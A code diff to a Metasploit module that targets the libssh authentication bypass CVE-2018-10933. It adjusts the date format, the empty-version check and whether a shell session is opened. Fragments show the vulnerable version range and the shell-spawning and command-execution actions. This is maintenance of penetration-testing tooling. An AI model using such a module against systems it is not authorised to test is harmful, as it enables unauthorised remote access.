@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
         ['CVE', '2018-10933'],
         ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
       ],
-      'DisclosureDate' => 'Oct 16 2018',
+      'DisclosureDate' => '2018-10-16',
       'License'        => MSF_LICENSE,
       'Actions'        => [
         ['Shell',   'Description' => 'Spawn a shell'],
@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
     if v.nil?
       vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
       Exploit::CheckCode::Unknown
-    elsif v == Gem::Version.new('')
+    elsif v.to_s.empty?
       vprint_warning("#{ip}:#{rport} - libssh version not reported")
       Exploit::CheckCode::Detected
     elsif v.between?(Gem::Version.new('0.6.0'), Gem::Version.new('0.7.5')) ||
@@ -137,7 +137,9 @@ class MetasploitModule < Msf::Auxiliary
 
     case action.name
     when 'Shell'
-      start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+      if datastore['CreateSession']
+        start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+      end
     when 'Execute'
       output = shell.channel && (shell.channel[:data] || '').chomp
 
